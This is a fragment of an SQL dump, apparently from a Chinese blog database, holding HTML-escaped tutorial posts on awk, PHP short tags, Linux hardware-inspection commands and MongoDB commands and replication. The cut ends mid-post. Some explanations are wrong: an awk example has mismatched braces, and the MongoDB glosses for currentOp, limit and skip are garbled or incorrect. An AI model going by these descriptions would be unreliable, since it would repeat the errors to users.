/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;BEGIN 表示在处理任意行之前进行的操作&lt;/span&gt;，取得文件第一个列域的最大值&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;/span&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;#39;{$1 == &amp;#39;Chi&amp;#39; {$3 = &amp;#39;China&amp;#39;; print}&amp;#39; file&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;找到匹配行后先将第3个域替换后再显示该行（记录）&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;#39;{$7 %= 3; print $7}&amp;#39; &amp;nbsp;file&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;将第7域被3除，并将余数赋给第7域再打印&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;#39;/tom/ {count++;} &lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; END {print &amp;quot;tom was found &amp;quot;count&amp;quot; times&amp;quot;}&amp;#39; file &lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;END表示在所有输入行处理完后进行处理&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;#39;gsub(/$/,&amp;quot;&amp;quot;);gsub(/,/,&amp;quot;&amp;quot;); cost+=$4;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; END {print &amp;quot;The total is $&amp;quot; cost&amp;gt;&amp;quot;filename&amp;quot;}&amp;#39; &amp;nbsp; &amp;nbsp;file &lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;gsub函数用空串替换$和,再将结果输出到filename中&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;{gsub(/$/,&amp;quot;&amp;quot;);gsub(/,/,&amp;quot;&amp;quot;);&lt;br /&gt; &amp;nbsp; &amp;nbsp;if ($4&amp;gt;1000&amp;amp;&amp;amp;$4&amp;lt;2000) c1+=$4;&lt;br /&gt; &amp;nbsp; &amp;nbsp;else if ($4&amp;gt;2000&amp;amp;&amp;amp;$4&amp;lt;3000) c2+=$4;&lt;br /&gt; &amp;nbsp; &amp;nbsp;else if ($4&amp;gt;3000&amp;amp;&amp;amp;$4&amp;lt;4000) c3+=$4;&lt;br /&gt; &amp;nbsp; &amp;nbsp;else c4+=$4; }&lt;br /&gt; &amp;nbsp; &amp;nbsp;END {printf &amp;nbsp;&amp;quot;c1=[%d];c2=[%d];c3=[%d];c4=[%d]\n&amp;quot;,c1,c2,c3,c4}&amp;quot;&amp;#39; file&lt;br /&gt; &amp;nbsp; &amp;nbsp;通过if和else if完成条件语句&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;awk &amp;#39;{gsub(/$/,&amp;quot;&amp;quot;);gsub(/,/,&amp;quot;&amp;quot;);&lt;br /&gt; &amp;nbsp; &amp;nbsp;if ($4&amp;gt;3000&amp;amp;&amp;amp;$4&amp;lt;4000) exit;&lt;br /&gt; &amp;nbsp; &amp;nbsp;else c4+=$4; }&lt;br /&gt; &amp;nbsp; &amp;nbsp;END {printf &amp;nbsp;&amp;quot;c1=[%d];c2=[%d];c3=[%d];c4=[%d]\n&amp;quot;,c1,c2,c3,c4}&amp;quot;&amp;#39; file&lt;br /&gt; &amp;nbsp; &amp;nbsp;通过exit在某条件时退出，但是仍执行END操作。&lt;br /&gt; &amp;nbsp; &amp;nbsp;awk &amp;#39;{gsub(/$/,&amp;quot;&amp;quot;);gsub(/,/,&amp;quot;&amp;quot;);&lt;br /&gt; &amp;nbsp; &amp;nbsp;if ($4&amp;gt;3000) next;&lt;br /&gt; &amp;nbsp; &amp;nbsp;else c4+=$4; }&lt;br /&gt; &amp;nbsp; &amp;nbsp;END {printf &amp;nbsp;&amp;quot;c4=[%d]\n&amp;quot;,c4}&amp;quot;&amp;#39; file&lt;br /&gt; &amp;nbsp; &amp;nbsp;通过next在某条件时跳过该行，对下一行执行操作&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;BEGIN {system(&amp;quot;echo &amp;quot;Input your name:\\c&amp;quot;&amp;quot;); getline d;print &amp;quot;\nYour name is&amp;quot;,d,&amp;quot;!\n&amp;quot;}&amp;#39;&lt;br /&gt;通过getline命令交互输入name，并显示出来&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;BEGIN {FS=&amp;quot;:&amp;quot;; while(getline&amp;lt; &amp;quot;/etc/passwd&amp;quot; &amp;gt;0) { if($1~&amp;quot;050[0-9]_&amp;quot;) print $1}}&amp;#39;&lt;br /&gt;打印/etc/passwd文件中用户名包含050x_的用户名&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;{ i=1;while(i&amp;lt;NF) {print NF,$i;i++}}&amp;#39; file 通过while语句实现循环&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;{ for(i=1;i&amp;lt;NF;i++) {print NF,$i}}&amp;#39; &amp;nbsp; file 通过for语句实现循环&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;type file|awk -F &amp;quot;/&amp;quot; &amp;#39;&lt;br /&gt; &amp;nbsp; &amp;nbsp;{ for(i=1;i&amp;lt;NF;i++)&lt;br /&gt; &amp;nbsp; &amp;nbsp;{ if(i==NF-1) { printf &amp;quot;%s&amp;quot;,$i }&lt;br /&gt; &amp;nbsp; &amp;nbsp;else { printf &amp;quot;%s/&amp;quot;,$i }&lt;/span&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt; }&lt;/span&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;}&amp;#39;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;显示一个文件的全路径&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;用for和if显示日期&lt;br /&gt;awk &amp;nbsp;&amp;#39;BEGIN {&lt;br /&gt;for(j=1;j&amp;lt;=12;j++)&lt;br /&gt;{ flag=0;&lt;br /&gt; &amp;nbsp;printf &amp;quot;\n%d月份\n&amp;quot;,j;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;for(i=1;i&amp;lt;=31;i++)&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;{&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;if (j==2&amp;amp;&amp;amp;i&amp;gt;28) flag=1;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;if ((j==4||j==6||j==9||j==11)&amp;amp;&amp;amp;i&amp;gt;30) flag=1;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;if (flag==0) {printf &amp;quot;%02d%02d &amp;quot;,j,i}&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;br /&gt;}&lt;br /&gt;}&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;在awk中调用系统变量必须用单引号，如果是双引号，则表示字符串&lt;br /&gt;Flag=abcd&lt;br /&gt;awk &amp;#39;{print &amp;#39;$Flag&amp;#39;}&amp;#39; &amp;nbsp; 结果为abcd&lt;br /&gt;awk &amp;#39;{print &amp;nbsp;&amp;quot;$Flag&amp;quot;}&amp;#39; &amp;nbsp; 结果为$Flag&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考文档：&lt;a target=&quot;_blank&quot; href=&quot;http://www.linux.gov.cn/shell/awk.htm&quot;&gt;http://www.linux.gov.cn/shell/awk.htm&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.cnblogs.com/repository/archive/2011/05/13/2045927.html&quot;&gt;http://www.cnblogs.com/repository/archive/2011/05/13/2045927.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386775909),
(39, 39, '&lt;p&gt;PHP默认支持简写标记是：&lt;/p&gt;&lt;p&gt;&amp;lt;?php&lt;/p&gt;&lt;p&gt;?&amp;gt;&lt;/p&gt;&lt;p&gt;但他也可以支持像以下的PHP标记：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?=$hello;?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;我们称其为短标记，要使用短标记，需要修改php.ini中的short_open_tag=On&lt;br /&gt;&lt;/p&gt;', 1386776036),
(40, 40, '&lt;p&gt;测试机器的硬件信息：&lt;br /&gt;&lt;br /&gt;查看CPU信息（型号）&lt;br /&gt;# cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;8 &amp;nbsp;Intel(R) Xeon(R) CPU &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;E5410 &amp;nbsp; @ 2.33GHz&lt;br /&gt;(看到有8个逻辑CPU, 也知道了CPU型号)&lt;br /&gt;&lt;br /&gt;# cat /proc/cpuinfo | grep physical | uniq -c&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;4 physical id &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;4 physical id &amp;nbsp; &amp;nbsp; &amp;nbsp;: 1&lt;br /&gt;(说明实际上是两颗4核的CPU)&lt;br /&gt;&lt;br /&gt;# getconf LONG_BIT&lt;br /&gt; &amp;nbsp; 32&lt;br /&gt;(说明当前CPU运行在32bit模式下, 但不代表CPU不支持64bit)&lt;br /&gt;&lt;br /&gt;# cat /proc/cpuinfo | grep flags | grep &amp;#39; lm &amp;#39; | wc -l&lt;br /&gt; &amp;nbsp; 8&lt;br /&gt;(结果大于0, 说明支持64bit计算. lm指long mode, 支持lm则是64bit)&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;再完整看cpu详细信息, 不过大部分我们都不关心而已.&lt;br /&gt;# dmidecode | grep &amp;#39;Processor Information&amp;#39;&lt;br /&gt;&lt;br /&gt;查看内 存信息&lt;br /&gt;# cat /proc/meminfo&lt;br /&gt;&lt;br /&gt;# uname -a&lt;br /&gt;Linux euis1 2.6.9-55.ELsmp #1 SMP Fri Apr 20 17:03:35 EDT 2007 i686 i686 i386 GNU/Linux&lt;br /&gt;(查看当前操作系统内核信息)&lt;br /&gt;&lt;br /&gt;# cat /etc/issue | grep Linux&lt;br /&gt;Red Hat Enterprise Linux AS release 4 (Nahant Update 5)&lt;br /&gt;(查看当前操作系统发行版信息)&lt;br /&gt;&lt;br /&gt;查看机器型号&lt;br /&gt;# dmidecode | grep &amp;quot;Product Name&amp;quot; &amp;nbsp;&lt;br /&gt;&lt;br /&gt;查看网卡信息&lt;br /&gt;&lt;/p&gt;&lt;p&gt;# dmesg | grep -i eth&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;查看磁盘使用情况&lt;/p&gt;&lt;p&gt;# df -lh&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考资料：&lt;a target=&quot;_blank&quot; href=&quot;http://www.oschina.net/question/12_30886?sort=time&quot;&gt;http://www.oschina.net/question/12_30886?sort=time&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386776112),
(41, 41, '&lt;p&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;1、基本操作&lt;br /&gt;&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;db.AddUser(username,password)添加用户&lt;br /&gt;db.auth(usrename,password) 设置数据库连接验证&lt;br /&gt;db.cloneDataBase(fromhost) 从目标服务器克隆一个数据库&lt;br /&gt;db.commandHelp(name) returns the help for the command&lt;br /&gt;db.copyDatabase(fromdb,todb,fromhost)复制数据库fromdb---源数据库名称，todb---目标数据库名称，fromhost---源数据库服务器地址&lt;br /&gt;db.createCollection(name,{size:3333,capped:333,max:88888})创建一个数据集，相当于一个表&lt;br /&gt;db.currentOp() 取消当前库的当前操作&lt;br /&gt;db.dropDataBase() 删除当前数据库&lt;br /&gt;db.eval_r(func,args) run code server-side&lt;br /&gt;db.getCollection(cname) 取得一个数据集合，同用法：db[&amp;#39;cname&amp;#39;] or&lt;br /&gt;db.getCollenctionNames() 取得所有数据集合的名称列表&lt;br /&gt;db.getLastError() 返回最后一个错误的提示消息&lt;br /&gt;db.getLastErrorObj() 返回最后一个错误的对象&lt;br /&gt;db.getMongo() 取得当前服务器的连接对象get the server&lt;br /&gt;db.getMondo().setSlaveOk() allow this connection to read from thennonmaster membr of a replica pair&lt;br /&gt;db.getName() 返回当操作数据库的名称&lt;br /&gt;db.getPrevError() 返回上一个错误对象&lt;br /&gt;db.getProfilingLevel()&lt;br /&gt;db.getReplicationInfo() 获得重复的数据&lt;br /&gt;db.getSisterDB(name) get the db at the same server as thisonew&lt;br /&gt;db.killOp() 停止（杀死）在当前库的当前操作&lt;br /&gt;db.printCollectionStats() 返回当前库的数据集状态&lt;br /&gt;db.printReplicationInfo()&lt;br /&gt;db.printSlaveReplicationInf&lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;o()&lt;br /&gt;db.printShardingStatus() 返回当前数据库是否为共享数据库&lt;br /&gt;db.removeUser(username) 删除用户&lt;br /&gt;db.repairDatabase() 修复当前数据库&lt;br /&gt;db.resetError()&lt;br /&gt;db.runCommand(cmdObj) run a database command. if cmdObj is astring, turns it into {cmdObj:1}&lt;br /&gt;db.setProfilingLevel(level) 0=off,1=slow,2=all&lt;br /&gt;db.shutdownServer() 关闭当前服务程序&lt;br /&gt;db.version() 返回当前程序的版本信息&lt;/span&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;2、数据集(表)操作&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;db.test.find({id:10}) 返回test数据集ID=10的数据集&lt;br /&gt;db.test.find({id:10}).count() 返回test数据集ID=10的数据总数&lt;br /&gt;db.test.find({id:10}).limit(2) 返回test数据集ID=10的数据集从第二条开始的数据集&lt;br /&gt;db.test.find({id:10}).skip(8) 返回test数据集ID=10的数据集从0到第八条的数据集&lt;br /&gt;db.test.find({id:10}).limit(2).skip(8)返回test数据集ID=1=的数据集从第二条到第八条的数据&lt;br /&gt;db.test.find({id:10}).sort() 返回test数据集ID=10的排序数据集&lt;br /&gt;db.test.findOne([query]) 返回符合条件的一条数据&lt;br /&gt;db.test.getDB() 返回此数据集所属的数据库名称&lt;br /&gt;db.test.getIndexes() 返回些数据集的索引信息&lt;br /&gt;db.test.group({key:...,initial:...,reduce:...[,cond:...]})&lt;br /&gt;db.test.mapReduce(mayFunction,reduceFunction,&amp;lt;optionalparams&amp;gt;)&lt;br /&gt;db.test.remove(query) 在数据集中删除一条数据&lt;br /&gt;db.test.renameCollection(newName) 重命名些数据集名称&lt;br /&gt;db.test.save(obj) 往数据集中插入一条数据&lt;br /&gt;db.test.stats() 返回此数据集的状态&lt;br /&gt;db.test.storageSize() 返回此数据集的存储大小&lt;br /&gt;db.test.totalIndexSize() 返回此数据集的索引文件大小&lt;br /&gt;db.test.totalSize() 返回些数据集的总大小&lt;br /&gt;db.test.update(query,object[,upsert_bool]) 在此数据集中更新一条数据&lt;br /&gt;db.test.validate() 验证此数据集&lt;br /&gt;db.test.getShardVersion() 返回数据集共享版本号&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;3、MongoDB语法与现有关系型数据库SQL语法比较&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;MongoDB语法 MySql语法&lt;br /&gt;db.test.find({&amp;#39;name&amp;#39;:&amp;#39;foobar&amp;#39;}) &amp;lt;==&amp;gt;select * from test where name=&amp;#39;foobar&amp;#39;&lt;br /&gt;db.test.find() &amp;lt;==&amp;gt; select * fromtest&lt;br /&gt;db.test.find({&amp;#39;ID&amp;#39;:10}).count() &amp;lt;==&amp;gt;select count(*) from test where ID=10&lt;br /&gt;db.test.find().skip(10).limit(20)&amp;lt;==&amp;gt; select * from test limit10,20&lt;br /&gt;db.test.find({&amp;#39;ID&amp;#39;:{$in:[25,35,45]}})&amp;lt;==&amp;gt; select * from test where ID in(25,35,45)&lt;br /&gt;db.test.find().sort({&amp;#39;ID&amp;#39;:-1}) &amp;lt;==&amp;gt;select * from test order by ID desc&lt;br /&gt;db.test.distinct(&amp;#39;name&amp;#39;,{&amp;#39;ID&amp;#39;:{$lt:20}})&amp;lt;==&amp;gt; select distinct(name) from testwhere ID&amp;lt;20&lt;br /&gt;db.test.group({key:{&amp;#39;name&amp;#39;:true},cond:{&amp;#39;name&amp;#39;:&amp;#39;foo&amp;#39;},reduce:function(obj,prev){prev.msum+=obj.marks;},initial:{msum:0}})&amp;lt;==&amp;gt; select name,sum(marks) from testgroup by name&lt;br /&gt;db.test.find(&amp;#39;this.ID&amp;lt;20&amp;#39;,{name:1})&amp;lt;==&amp;gt; select name from test whereID&amp;lt;20&lt;br /&gt;db.test.insert({&amp;#39;name&amp;#39;:&amp;#39;foobar&amp;#39;,&amp;#39;age&amp;#39;:25})&amp;lt;==&amp;gt;insertinto test (&amp;#39;name&amp;#39;,&amp;#39;age&amp;#39;) values(&amp;#39;foobar&amp;#39;,25)&lt;br /&gt;db.test.remove({}) &amp;lt;==&amp;gt; delete * fromtest&lt;br /&gt;db.test.remove({&amp;#39;age&amp;#39;:20}) &amp;lt;==&amp;gt;delete test where age=20&lt;br /&gt;db.test.remove({&amp;#39;age&amp;#39;:{$lt:20}}) &amp;lt;==&amp;gt;elete test where age&amp;lt;20&lt;br /&gt;db.test.remove({&amp;#39;age&amp;#39;:{$lte:20}})&amp;lt;==&amp;gt; delete test whereage&amp;lt;=20&lt;br /&gt;db.test.remove({&amp;#39;age&amp;#39;:{$gt:20}}) &amp;lt;==&amp;gt;delete test where age&amp;gt;20&lt;br /&gt;db.test.remove({&amp;#39;age&amp;#39;:{$gte:20}})&amp;lt;==&amp;gt; delete test whereage&amp;gt;=20&lt;br /&gt;db.test.remove({&amp;#39;age&amp;#39;:{$ne:20}}) &amp;lt;==&amp;gt;delete test where age!=20&lt;br /&gt;db.test.update({&amp;#39;name&amp;#39;:&amp;#39;foobar&amp;#39;},{$set:{&amp;#39;age&amp;#39;:36}})&amp;lt;==&amp;gt; update test set age=36 wherename=&amp;#39;foobar&amp;#39;&lt;br /&gt;db.test.update({&amp;#39;name&amp;#39;:&amp;#39;foobar&amp;#39;},{$inc:{&amp;#39;age&amp;#39;:3}})&amp;lt;==&amp;gt; update test set age=age+3where&lt;br /&gt;name=&amp;#39;foobar&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;返回执行语句的状态信息&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;db.test.find(&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;{&amp;quot;username&amp;quot;:/测试/}&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;).skip(0).limit(100000).explain();&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;{   \r\n    &quot;cursor&quot; : &quot;BasicCursor&quot;,#游标类型   \r\n    &quot;nscanned&quot; : 2010000,#扫描数量   \r\n    &quot;nscannedObjects&quot; : 2010000,#扫描对象   \r\n    &quot;n&quot; : 337800,#返回数据   \r\n    &quot;millis&quot; : 2838,#耗时   \r\n    &quot;nYields&quot; : 0,   \r\n    &quot;nChunkSkips&quot; : 0,   \r\n    &quot;isMultiKey&quot; : false,   \r\n    &quot;indexOnly&quot; : false,   \r\n    &quot;indexBounds&quot; : {#使用索引（这里没有）   \r\n                              \r\n    }   \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;4、MongoDB主从复制介绍&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;MongoDB的主从复制其实很简单，就是在运行 主的服务器 上开启mongod进程 时，加入参数--master即可，在运行从的服务器上开启mongod进程时，加入--slave 和 --source 指定主即可，这样，在主数据 库更新时，数据被复制到从数据库中&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;(这里日志 文件 和访问 数据时授权用户暂时不考虑 )&lt;br /&gt;下面我在单台服务器上开启2 deamon来模拟2台服务器进行主从复制：&lt;br /&gt;$ mkdir m_master m_slave&lt;br /&gt;$mongodb/bin/mongod &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; --port &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;28018 --dbpath ~/m_master &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;--master &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; &amp;amp;&lt;br /&gt;$mongodb/bin/mongod &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; --port &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;28019 --dbpath ~/m_slave &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;--slave &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;--source &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;localhost:28018 &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; &amp;amp;&lt;br /&gt;这样主从服务器都已经启动了，可以利用 netstat -an -t 查看28018、28019端口是否开放&lt;br /&gt;&lt;/span&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;登录主服务器：&lt;br /&gt;$ mongodb/bin/mongo --port 28018&lt;br /&gt;MongoDB shell version: 1.2.4-&lt;br /&gt;url: test&lt;br /&gt;connecting to: 127.0.0.1:28018/test&lt;br /&gt;type &amp;quot;help&amp;quot; for help&lt;br /&gt;&amp;gt; show dbs&lt;br /&gt;admin&lt;br /&gt;local&lt;br /&gt;test&lt;br /&gt;&amp;gt; use test&lt;br /&gt;switched to db test&lt;br /&gt;&amp;gt; show collections&lt;br /&gt;这里主上的test数据什么表都没有，为空，查看从服 务器同样也是这样&lt;br /&gt;$ mongodb/bin/mongo --port 28019&lt;br /&gt;MongoDB shell version: 1.2.4-&lt;br /&gt;url: test&lt;br /&gt;connecting to: 127.0.0.1:28019/test&lt;br /&gt;type &amp;quot;help&amp;quot; for help&lt;br /&gt;&amp;gt; show dbs&lt;br /&gt;admin&lt;br /&gt;local&lt;br /&gt;test&lt;br /&gt;&amp;gt; use test&lt;br /&gt;switched to db test&lt;br /&gt;&amp;gt; show collections&lt;br /&gt;那么现在我们来验证主从数据是否会像想象的那样同步 呢？&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;我们在主上新建表user&lt;br /&gt;&amp;gt; db &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;test&lt;br /&gt;&amp;gt;db.createCollection(&amp;quot;user&amp;quot;);&lt;br /&gt;&amp;gt; showcollections &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;system.indexes&lt;br /&gt;user&lt;br /&gt;&amp;gt;&lt;br /&gt;表 user已经存在了，而且test库中还多了一个system.indexes用来存放索引的表&lt;/span&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;到从服务器上查看test库：&lt;br /&gt;&amp;gt; db &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;test&lt;br 